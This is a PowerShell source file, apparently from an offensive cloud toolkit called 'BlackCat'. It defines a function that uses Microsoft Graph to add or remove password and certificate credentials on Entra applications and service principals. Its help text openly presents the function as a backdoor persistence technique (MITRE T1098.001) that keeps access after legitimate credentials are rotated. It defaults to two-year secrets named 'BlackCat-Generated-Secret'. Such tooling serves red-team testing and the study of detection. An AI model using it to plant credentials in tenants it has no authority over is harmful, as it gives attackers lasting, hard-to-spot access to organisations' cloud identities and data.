function Set-ServicePrincipalCredential {
    [CmdletBinding(SupportsShouldProcess = $true, DefaultParameterSetName = 'AddPassword')]
    param (
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [ValidatePattern('^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', ErrorMessage = "It does not match expected GUID pattern")]
        [Alias('Id', 'object-id', 'application-id')]
        [string]$ObjectId,

        [Parameter(Mandatory = $true, ParameterSetName = 'AddPassword')]
        [Parameter(Mandatory = $true, ParameterSetName = 'AddCertificate')]
        [Parameter(Mandatory = $true, ParameterSetName = 'RemoveCredential')]
        [ValidateSet('AddPassword', 'AddCertificate', 'RemovePassword', 'RemoveCertificate')]
        [string]$Action,

        [Parameter(Mandatory = $false, ParameterSetName = 'AddPassword')]
        [string]$DisplayName = "BlackCat-Generated-Secret",

        [Parameter(Mandatory = $false, ParameterSetName = 'AddPassword')]
        [datetime]$EndDateTime = (Get-Date).AddYears(2),

        [Parameter(Mandatory = $true, ParameterSetName = 'AddCertificate')]
        [string]$CertificateData,

        [Parameter(Mandatory = $false, ParameterSetName = 'AddCertificate')]
        [string]$CertificateDisplayName = "BlackCat-Generated-Certificate",

        [Parameter(Mandatory = $false, ParameterSetName = 'AddCertificate')]
        [datetime]$CertificateEndDateTime = (Get-Date).AddYears(2),

        [Parameter(Mandatory = $true, ParameterSetName = 'RemoveCredential')]
        [ValidatePattern('^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', ErrorMessage = "It does not match expected GUID pattern")]
        [string]$KeyId,

        [Parameter(Mandatory = $false, ParameterSetName = 'AddPassword')]
        [switch]$GenerateSecret,

        [Parameter(Mandatory = $false)]
        [switch]$UseApplicationEndpoint
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ResourceTypeName 'MSGraph'
    }

    process {
        try {
            # Determine if we're working with an Application or Service Principal
            $entityType = if ($UseApplicationEndpoint) { "applications" } else { "servicePrincipals" }
            
            # First, verify the object exists
            Write-Verbose "Verifying $entityType with ObjectId: $ObjectId"
            $entity = Invoke-MsGraph -relativeUrl "$entityType/$ObjectId" -NoBatch -ErrorAction SilentlyContinue
            if (-not $entity) {
                Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message "$entityType with ObjectId '$ObjectId' not found." -Severity 'Error'
                return
            }

            Write-Verbose "Found ${entityType}: $($entity.displayName)"

            switch ($Action) {
                'AddPassword' {
                    if ($PSCmdlet.ShouldProcess("$entityType '$($entity.displayName)'", "Add password credential")) {
                        $uri = "$($sessionVariables.graphUri)/$entityType/$ObjectId/addPassword"
                        
                        $passwordCredential = @{
                            displayName = $DisplayName
                            endDateTime = $EndDateTime.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
                        }

                        if ($GenerateSecret) {
                            # Let Microsoft Graph generate the secret
                            $body = @{
                                passwordCredential = $passwordCredential
                            } | ConvertTo-Json -Depth 3
                        } else {
                            # Generate our own secret
                            $secretValue = [System.Web.Security.Membership]::GeneratePassword(32, 8)
                            $passwordCredential.secretText = $secretValue
                            
                            $body = @{
                                passwordCredential = $passwordCredential
                            } | ConvertTo-Json -Depth 3
                        }

                        $requestParam = @{
                            Headers = $script:graphHeader
                            Uri     = $uri
                            Method  = 'POST'
                            Body    = $body
                            ContentType = 'application/json'
                            UserAgent = $sessionVariables.userAgent
                        }

                        Write-Verbose "Adding password credential to $entityType"
                        $response = Invoke-RestMethod @requestParam
                        
                        Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message "Password credential added successfully with KeyId: $($response.keyId)" -Severity 'Information'
                        return $response
                    }
                }

                'AddCertificate' {
                    if ($PSCmdlet.ShouldProcess("$entityType '$($entity.displayName)'", "Add certificate credential")) {
                        $uri = "$($sessionVariables.graphUri)/$entityType/$ObjectId/addKey"
                        
                        # Validate certificate data format (should be base64 encoded)
                        try {
                            [System.Convert]::FromBase64String($CertificateData) | Out-Null
                        } catch {
                            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message "Certificate data must be base64 encoded" -Severity 'Error'
                            return
                        }

                        $keyCredential = @{
                            type = "AsymmetricX509Cert"
                            usage = "Verify"
                            key = $CertificateData
                            displayName = $CertificateDisplayName
                            endDateTime = $CertificateEndDateTime.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
                        }

                        $body = @{
                            keyCredential = $keyCredential
                            passwordCredential = $null
                            proof = $null
                        } | ConvertTo-Json -Depth 3

                        $requestParam = @{
                            Headers = $script:graphHeader
                            Uri     = $uri
                            Method  = 'POST'
                            Body    = $body
                            ContentType = 'application/json'
                            UserAgent = $sessionVariables.userAgent
                        }

                        Write-Verbose "Adding certificate credential to $entityType"
                        $response = Invoke-RestMethod @requestParam
                        
                        Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message "Certificate credential added successfully with KeyId: $($response.keyId)" -Severity 'Information'
                        return $response
                    }
                }

                'RemovePassword' {
                    if ($PSCmdlet.ShouldProcess("$entityType '$($entity.displayName)'", "Remove password credential '$KeyId'")) {
                        $uri = "$($sessionVariables.graphUri)/$entityType/$ObjectId/removePassword"
                        
                        $body = @{
                            keyId = $KeyId
                        } | ConvertTo-Json

                        $requestParam = @{
                            Headers = $script:graphHeader
                            Uri     = $uri
                            Method  = 'POST'
                            Body    = $body
                            ContentType = 'application/json'
                            UserAgent = $sessionVariables.userAgent
                        }

                        Write-Verbose "Removing password credential from $entityType"
                        Invoke-RestMethod @requestParam
                        
                        Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message "Password credential with KeyId '$KeyId' removed successfully" -Severity 'Information'
                    }
                }

                'RemoveCertificate' {
                    if ($PSCmdlet.ShouldProcess("$entityType '$($entity.displayName)'", "Remove certificate credential '$KeyId'")) {
                        $uri = "$($sessionVariables.graphUri)/$entityType/$ObjectId/removeKey"
                        
                        $body = @{
                            keyId = $KeyId
                            proof = $null
                        } | ConvertTo-Json

                        $requestParam = @{
                            Headers = $script:graphHeader
                            Uri     = $uri
                            Method  = 'POST'
                            Body    = $body
                            ContentType = 'application/json'
                            UserAgent = $sessionVariables.userAgent
                        }

                        Write-Verbose "Removing certificate credential from $entityType"
                        Invoke-RestMethod @requestParam
                        
                        Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message "Certificate credential with KeyId '$KeyId' removed successfully" -Severity 'Information'
                    }
                }
            }
        }
        catch {
            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message $($_.Exception.Message) -Severity 'Error'
        }
    }

    end {
        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"
    }

<#
.SYNOPSIS
Manages credentials for Entra applications and service principals.

.DESCRIPTION
Manages credentials for Entra applications and service principals. Allows adding new passwords or certificates for continued access, even if legitimate credentials are compromised or rotated. Essential for backdoor persistence mechanisms.

.PARAMETER ObjectId
The Object ID (GUID) of the Microsoft Entra application or service principal. This parameter is mandatory and must match the pattern of a valid GUID.

.PARAMETER Action
Specifies the action to perform on the credential. Valid values are:
- AddPassword: Adds a new password credential
- AddCertificate: Adds a new certificate credential  
- RemovePassword: Removes an existing password credential
- RemoveCertificate: Removes an existing certificate credential

.PARAMETER DisplayName
The display name for the password credential. Only used with AddPassword action. Defaults to "BlackCat-Generated-Secret".

.PARAMETER EndDateTime
The expiration date and time for the password credential. Only used with AddPassword action. Defaults to 2 years from now.

.PARAMETER CertificateData
Base64-encoded certificate data for the certificate credential. Required for AddCertificate action.

.PARAMETER CertificateDisplayName
The display name for the certificate credential. Only used with AddCertificate action. Defaults to "BlackCat-Generated-Certificate".

.PARAMETER CertificateEndDateTime
The expiration date and time for the certificate credential. Only used with AddCertificate action. Defaults to 2 years from now.

.PARAMETER KeyId
The unique identifier (GUID) of the credential to remove. Required for RemovePassword and RemoveCertificate actions.

.PARAMETER GenerateSecret
When specified with AddPassword, lets Microsoft Graph generate the secret value. Otherwise, a random secret is generated locally.

.PARAMETER UseApplicationEndpoint
When specified, uses the applications endpoint instead of servicePrincipals endpoint. Use this when working with application registrations directly.

.EXAMPLE
Set-ServicePrincipalCredential -ObjectId "12345678-1234-1234-1234-123456789012" -Action AddPassword -DisplayName "MyApp-Secret"

Adds a new password credential to the specified service principal with a custom display name.

.EXAMPLE
Set-ServicePrincipalCredential -ObjectId "12345678-1234-1234-1234-123456789012" -Action AddPassword -GenerateSecret

Adds a new password credential where Microsoft Graph generates the secret value.

.EXAMPLE
Set-ServicePrincipalCredential -ObjectId "12345678-1234-1234-1234-123456789012" -Action AddCertificate -CertificateData "MIIC..." -CertificateDisplayName "MyApp-Cert"

Adds a new certificate credential to the specified service principal.

.EXAMPLE
Set-ServicePrincipalCredential -ObjectId "12345678-1234-1234-1234-123456789012" -Action RemovePassword -KeyId "87654321-4321-4321-4321-210987654321"

Removes the password credential with the specified KeyId from the service principal.

.EXAMPLE
Set-ServicePrincipalCredential -ObjectId "12345678-1234-1234-1234-123456789012" -Action AddPassword -UseApplicationEndpoint

Adds a password credential using the applications endpoint instead of servicePrincipals endpoint.

.NOTES
- This function requires authentication to the Microsoft Graph API with appropriate permissions
- For password credentials: Application.ReadWrite.All or Directory.ReadWrite.All
- For certificate credentials: Application.ReadWrite.All or Directory.ReadWrite.All
- The function supports both applications and servicePrincipals endpoints
- Certificate data must be provided as base64-encoded string
- Generated secrets are returned in the response for AddPassword actions

.LINK
https://learn.microsoft.com/en-us/graph/api/application-addpassword
https://learn.microsoft.com/en-us/graph/api/application-addkey
https://learn.microsoft.com/en-us/graph/api/application-removepassword
https://learn.microsoft.com/en-us/graph/api/application-removekey

.LINK
MITRE ATT&CK Tactic: TA0003 - Persistence
https://attack.mitre.org/tactics/TA0003/

.LINK
MITRE ATT&CK Technique: T1098.001 - Account Manipulation: Additional Cloud Credentials
https://attack.mitre.org/techniques/T1098/001/

#>
}
